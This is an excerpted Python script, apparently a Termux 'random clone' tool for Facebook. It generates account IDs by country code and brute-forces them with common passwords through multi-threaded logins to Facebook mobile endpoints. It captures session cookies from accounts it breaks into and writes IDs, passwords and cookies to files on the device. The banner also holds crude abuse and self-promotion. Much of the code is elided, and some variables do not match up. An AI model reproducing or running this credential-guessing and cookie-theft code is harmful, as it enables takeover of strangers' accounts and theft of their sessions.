# fb id https://www.facebook.com/profile.php?id=100073610516677&mibextid=snXT6QWNt6Bj1tWr
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/uchiha-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
os.system("clear")
print("\033[1;32mJOIN MY \033[1;31mYOUTUBE \033[1;32mGYS")
os.system("xdg-open https://www.youtube.com/@ExoXKaiishu/")
__KAIISHUKAII__=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻 UCHIHA BY 🍂💛KAIISHUKAII 🙂💗 \x07')
#app  check 


logo =("""\033[1;37mWELCOME TO ELIISHA COMMAND
                                                       \033[1;32;40m⢀⣠⣤⡴⠶⠶⠖⠲⠶⠶⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀          ⠀⢀⣤⣾⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠷⣦⡀⠀⠀⠀⠀⠀
⠀          ⠀⠀⢀⣴⠟⠁⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⡀⠀⠀⠀
...
⠀⠀⠀          ⠀⠀⠈⠻⢿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠟⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀          ⠀⠀⠀⠈⠙⠛⠶⠶⠦⠤⠤⠤⠶⠶⠛⠋⠉⠀⠀⠀⠀⠀
               \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mMOLA ALLAH
...
\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
\x1b[1;97m-------┏─[🍁]━═━═━═━════✿══╡😎HASAN🪽╞══✿═══━═━═━═━[😜]─┓
\x1b[1;90m-------│           \x1b[1;93m\x1b[1;104mAAGE DEKH BOSDKE GIR JAAYEGA 1.4\033[0;m\x1b[1;93m               
\x1b[1;95m-------┠─[😈]━═━═━═━━═━═━═━════✿══╡🥰HASAN🪽╞══✿═══━═━═━═━━═━[😥]─┫
╔══════════════╗  ╔══════════════════════════╗
║╔═══════════╗ ║  ║╔══════╗╔══════╗          ║
║║𝗣𝗥𝗢𝗚𝗥𝗔𝗠𝗠𝗜𝗡𝗚║ ║  ║║𝗔𝗨𝗧𝗛𝗢𝗥║║HASAN AHMAD          ║
║╚═══════════╝ ║  ║╚══════╝╚══════╝          ║
║╔══════╗      ║  ║╔══════╗╔════════════╗    ║
║║VERSION║      ║  ║║║║1.0 ║    ║
║╚══════╝      ║  ║╚══════╝╚════════════╝    ║
║╔════════╗    ║  ║╔════════╗╔═════════════╗ ║
║║𝗧𝗘𝗥𝗠𝗨𝗫  ║    ║  ║║𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞║║HASAN AHMAD║ ║
║╚════════╝    ║  ║╚════════╝╚═════════════╝ ║
║╔══════════╗  ║  ║╔════════╗╔═════════════╗ ║
║║𝗪𝗛𝗔𝗧𝗛𝗔𝗣𝗣  ║  ║║BHAAR║║ ME JAAO TUM ║ ║
║╔══════════╗  ║  ║╔════════╗╔═════════════╗ ║
║║FRIEND ║  ║║║║KOI NHI ║ 
║╚══════════╝  ║  ║╚════════╝╚═════════════╝ ║║
╚══════════════╝  ╚══════════════════════════╝
\033[0;95m==========================================================
\033[31;44m HATTER KI MAA KI CHOOT MARUNGA
 HASAN XD ALWAYS FIRE 🍂\033[0;m
\033[0;95m==========================================================
""") 
...
oks = []
cps = []
os.system('espeak -a 300 " Welcome,   to,  HASAN AHMAD,  Tools"')
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/KAIISHU-98/aaprove.txt').text
  ...
  os.system('xdg-open https://www.facebook.com/profile.php?id=100073610516677')
  print("");time.sleep(2)
  print("\x1b[1;97m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/KAIISHU-98/aproobe.txt/main/aaprove.txt").text
    if id in httpCaht:
...
def tnx():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "_".join(uuid)
  server = requests.get('https://github.com/KAIISHU-98/aproobe.txt/main/aaprove.txt').text
...
def uchiha():
    os.system("clear")
    print(logo)
    print('\033[1;32m➤☄▂ ▃ ▄ ▅ ▆ ▇ █ █ █━━━KAIISHU━━━█ █ █ ▇ ▆ ▅ ▄ ▃ ▂༄: ̗̀➛☄')
    print("[1] \033[1;33m𓊈𒆜━✦❘NIPAL RANDOM CLONE❘✦━𒆜𓊉\n[2] \033[1;32m𓊈𒆜━✦❘INDIA RANDOM CLONE❘✦━𒆜𓊉\n[3] \033[1;37m𓊈𒆜━✦❘PK RANDOM CLONE❘✦━𒆜𓊉\n[4] \033[1;36m𓊈𒆜━✦❘BD RANDOM CLONE❘✦━𒆜𓊉\n[5]\033[1;35m𓊈𒆜━✦❘RANDOM CLONE WITH CHOOSE PSWD❘✦━𒆜𓊉\n[6] \033[1;33m𓊈𒆜━✦❘RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD❘✦━𒆜𓊉\n[7] \033[1;36m𓊈𒆜━✦❘CONTACT OWNER❘✦━𒆜𓊉")
    print(49*'=')
    kaiishu = input("✓CHOOSE>")
    if kaiishu =='1':uchiha1()
    elif kaiishu =='2':uchiha2()
    elif kaiishu =='3':uchiha3()
    elif kaiishu =='4':uchiha4()
    elif kaiishu =='5':uchiha5()
    elif kaiishu =='6':uchiha6()
    elif kaiishu =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100073610516677")
    else:
...
def uchiha1():
	...
	print("[🍁]━═━═━═━════✿══╡°˖✧✿✧˖°╞══✿═══━═━═━═━")
	uchihalovesyou = input("[+] [CHOOSE] :- ")
	if uchihalovesyou in ['y','Y','1','yes','YES','Yes']:
		uchiha_xd.append('y')
	else:
		uchiha_xd.append('n')
	print("[🍁]━═━═━═━════✿══╡°˖✧✿✧˖°╞══✿═══━═━═━═━")
	...
	print("[🍁]━═━═━═━════✿══╡°˖✧✿✧˖°╞══✿═══━═━═━═━")
	uchihatop = input("[+] [CHOOSE] :- ")
	if uchihatop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f"[+]STARTED YOUR CLONING TIME:> \033[1;92m"+time.strftime("%H:%M")+" " )
		print(f'[+] METHOD CHOOSED : M{uchihafire}')
		...
		for guru in user:
			...
			if uchihafire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif uchihafire =='2':yaari.submit(p,uid,pwx,tl)
			elif uchihafire =='3':yaari.submit(x,uid,pwx,tl)
			elif uchihafire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif uchihafire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif uchihafire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[✓] Ids saved in uchiha-OK.txt,uchiha-CP.txt')
...
def uchiha2():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(user))
		print('[🍁]━═━═━═━════✿══╡😎HASAN AHMAD🪽╞══✿═══━═━═━═━')
		print(f"\033[1;96m[\033[1;97m√\033[1;96m] \033[1;97m𝐔𝐒𝐄𝐑𝐒 𝐍𝐀𝐌𝐄\033[1;96m :\033[1;97m "+𝚞𝚗𝚊𝚖𝚎)
		...
		print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" " )
		print(f"\033[1;35m [+]USE FLIGHT MOD 5  SECOND ")
		for guru in user:
			uid = kode+guru
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'59039200','57273200','57575751','FreeFire','freefire','123free fire','freefire123']
			if uchihafire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif uchihafire =='2':yaari.submit(p,uid,pwx,tl)
			elif uchihafire =='3':yaari.submit(x,uid,pwx,tl)
			elif uchihafire =='4':yaari.submit(mobile,uid,pwx,tl)
	...
	print('[✓] Ids saved in HASAN-OK.txt,uchiha-CP.txt')
	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
print(47*"-")
...
def uchiha3():
	...
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[✓] Ids saved in H-OK.txt,uchiha-CP.txt')
	print(47*"-")
...
def uchiha5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if uchihafire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif uchihafire =='2':manshera.submit(p,uid,pwx,tl)
			elif uchihafire =='3':manshera.submit(x,uid,pwx,tl)
			elif uchihafire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif uchihafire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif uchihafire =='6':manshera.submit(d,uid,pwx,tl)
			else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[🪶HASAN-OK🪽] '+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in uchiha_xd:
				...
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[ELIISHA-CP] '+uid+' | '+ps+'\33[0;97m')
					open('/sdcard/ELIISHA-CP.txt', 'a').write(uid+' | '+ps+'\n')
					cps.append(uid)
					break
				else:
					open('/sdcard/ELIISHA-CP.txt', 'a').write(uid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M1-EXO-KAII🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'datr=jmabZTH6AQKtTl94UNwxa_q8; sb=jmabZZq2oMJrf8ZKReO0XrF2; m_pixel_ratio=2.75; locale=hi_IN; vpd=v1%3B750x393x2.75; wl_cbv=v2%3Bclient_version%3A2391%3Btimestamp%3A1704683211; wd=393x750; fr=0pSppAeUDQGPFPTVp.AWWspjLBxn0ZRhCAq6xHhEYqB7c.Blm2aO.9P.AAA.0.0.Blm2b6.AWVK09lhErs',
    'dpr': '2.75',
    'referer': 'https://x.facebook.com/?stype=lo&deoia=1&jlou=AfezdtTkeI_hkdDBL72EYdxrCF1Z_AzkhPx58g56ezmuTWdG2AMoIwN0SJrKvXRxBD0reSgrMLf1Unb0lI9rkIhYRJGrO8X1LhGoanTUtrmj4A&smuh=18501&lh=Ac_X10vGCFEUN1JSaeo&wtsid=rdr_05jaoKDS8XA1uExO2&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2205"',
    'sec-ch-ua-platform': '"Android"',
    ...
    'sec-fetch-user': '?1',
    'service-worker-navigation-preload': '{"k":"rev,1010704343;locale,hi_IN;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100089831629863;","a":"1704683213","t":31536000,"n":"mwJTY6hw","v":"2391","p":4,"r":1010704343,"o":"h2","y":"wblt"}',
    'upgrade-insecure-requests': '1',
    ...
    'viewport-width': '980',
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[🪶KA||SHU-OK🪽] '+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in uchiha_xd:
					print(f"\033[1;33m[COOKIES 🌺]: \033[1;32m{coki}")
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/uchiha-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[uchiha-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/uchiha-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/ELIISHA-CP.txt', 'a').write(cid+' | '+ps+'\n')
					break
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M2-EXO-KAII🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=jmabZTH6AQKtTl94UNwxa_q8; sb=jmabZZq2oMJrf8ZKReO0XrF2; m_pixel_ratio=2.75; locale=hi_IN; vpd=v1%3B750x393x2.75; wl_cbv=v2%3Bclient_version%3A2391%3Btimestamp%3A1704683211; wd=393x750; fr=0pSppAeUDQGPFPTVp.AWXLSwCIjx1HHDSsUgpPBy3fIUQ.Blm2aO.9P.AAA.0.0.Blm2d6.AWVFn2dOdjw',
    'dpr': '2.75',
    'referer': 'https://x.facebook.com/?stype=lo&deoia=1&jlou=AfezdtTkeI_hkdDBL72EYdxrCF1Z_AzkhPx58g56ezmuTWdG2AMoIwN0SJrKvXRxBD0reSgrMLf1Unb0lI9rkIhYRJGrO8X1LhGoanTUtrmj4A&smuh=18501&lh=Ac_X10vGCFEUN1JSaeo&wtsid=rdr_05jaoKDS8XA1uExO2&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    ...
    'viewport-width': '980',
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print(f'\r\033[10;92m[{time.strftime("%H:%M")}•ELIISHA X HASAN-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in uchiha_xd:
					print("\x1b[1;91m[🥵] \33[1;97m[NUMBER ]: \33[1;96m"+uid)
					print("\033[0;33m[🥵] \033[1;34m[AGENT]: \033[1;34m"+pro)					
					print("\33[1;93m[😎] \33[1;92m[COOKIES ]: \33[1;92m"+coki)
				open('/sdcard/HASAN-OK.txt', 'a').write(cid+' | '+ps+'|'+coki+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[HASAN-cp] '+cid+' | '+ps+'\33[0;97m')
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[ELIISHA HASAN-OKK] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ELIISHA HASAN-okkk.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/ELIISHA HASAN-okkk.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M3-ELIISHA HASAN-okkk🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'viewport-width': '980',
			...
			lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', params=params, cookies=cookies, headers=headers).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
				print('\33[1;92m[🪶KA||SHU-OK🪽]\033[1;32m'+uid+' | '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in uchiha_xd:
					print(f"\033[1;33m[COOKIES 🌺]: \033[1;32m{coki}")
					print('\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
					cek_apk(session,coki)
					...
					break
				open('/sdcard/ELIISHA-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M4-EXO-KAII🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				if 'y' in uchiha_xd:
					...
					break
				open('/sdcard/ELIISHA-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				if 'y' in baby:
					print('\33[1;91m[ELIISHA-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/ELIISHA-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M5-EXO-KAII🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests': '1',
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				uid = coki[151:166]
				print('\33[1;92m[🪶KA||SHU-OK🪽] ✮⃝  ﮩ٨ـﮩK4||SHUﮩ٨ـﮩ✮⃝    '+uid+' | 〲ﮩ٨ـﮩﮩ٨ـK4||ﮩ٨ '+ps+'|'+Joined(uid)+'\r\033[1;35m')
				if 'y' in uchiha_xd:
					print(f"\033[1;33m[COOKIES 🌺]:  \033[1;32m{coki}")
					cek_apk(session,coki)
				else:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;32m[M6-EXO-KAII🪽] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
